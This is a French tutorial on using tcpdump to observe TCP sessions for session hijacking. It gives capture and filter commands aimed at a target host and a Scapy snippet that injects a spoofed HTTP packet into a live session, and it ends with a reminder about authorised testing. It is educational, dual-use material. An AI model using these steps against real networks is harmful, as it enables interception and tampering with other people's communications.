# 1. Présentation et Contexte d'Utilisation de tcpdump pour le TCP Session Hijacking

**tcpdump** est un outil en ligne de commande permettant de capturer et d'analyser les paquets réseau en temps réel. Il est souvent utilisé par les administrateurs réseau et les experts en cybersécurité pour surveiller le trafic, diagnostiquer les problèmes de connectivité et détecter des activités suspectes. Dans le cadre d'attaques, **tcpdump** peut être exploité pour effectuer un **TCP Session Hijacking**, une technique où un attaquant intercepte et prend le contrôle d'une session TCP légitime entre deux parties. Cette attaque permet à l'attaquant d'insérer ou de modifier des paquets, compromettant ainsi l'intégrité et la confidentialité de la communication.

# 2. Commandes Pertinentes pour le TCP Session Hijacking avec tcpdump

## 1. **Capture de Trafic TCP**

Pour capturer du trafic TCP spécifique, on peut utiliser la commande suivante :

```bash  
sudo tcpdump -i eth0 tcp  
```

Cela permet de capturer tous les paquets TCP transitant sur l'interface réseau `eth0`.

Si l'on veut capturer uniquement les paquets liés à une connexion spécifique (exemple : IP cible `192.168.1.100` et port `80`) :

```bash  
sudo tcpdump -i eth0 host 192.168.1.100 and port 80  
```

## 2. **Filtrage des Sessions Actives**

Pour suivre une session en cours et identifier les séquences de paquets :

```bash  
sudo tcpdump -i eth0 tcp and host 192.168.1.100 -X  
```

L'option `-X` permet d'afficher le contenu des paquets en format ASCII et hexadécimal, ce qui facilite l'analyse.

## 3. **Interception et Analyse des Séquences TCP**

Une attaque de TCP Session Hijacking repose sur la prédiction des numéros de séquence TCP. Pour observer ces numéros :

```bash  
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -nn  
```

Cela permet d'analyser les séquences TCP lors de l'établissement de connexion.

## 4. **Injection de Paquets Malveillants**

Une fois les séquences identifiées, un attaquant peut utiliser un outil comme **Scapy** pour injecter des paquets et prendre le contrôle de la session :

```python  
from scapy.all import *

ip = IP(src="192.168.1.100", dst="192.168.1.200")  
tcp = TCP(sport=12345, dport=80, seq=1000, ack=2000, flags="PA")  
payload = "GET /malicious HTTP/1.1\r\nHost: victim.com\r\n\r\n"  
packet = ip/tcp/payload  
send(packet, verbose=1)  
```

Ce script simule une attaque en envoyant un faux paquet HTTP dans une session TCP légitime.

# Conclusion

Le **TCP Session Hijacking** est une attaque avancée exploitant les failles de gestion des sessions TCP. **tcpdump** permet d'observer et d'analyser ces sessions en profondeur. Il est important d'utiliser cet outil de manière légale et éthique, dans le cadre de tests de sécurité autorisés, afin de renforcer la protection des infrastructures réseau.
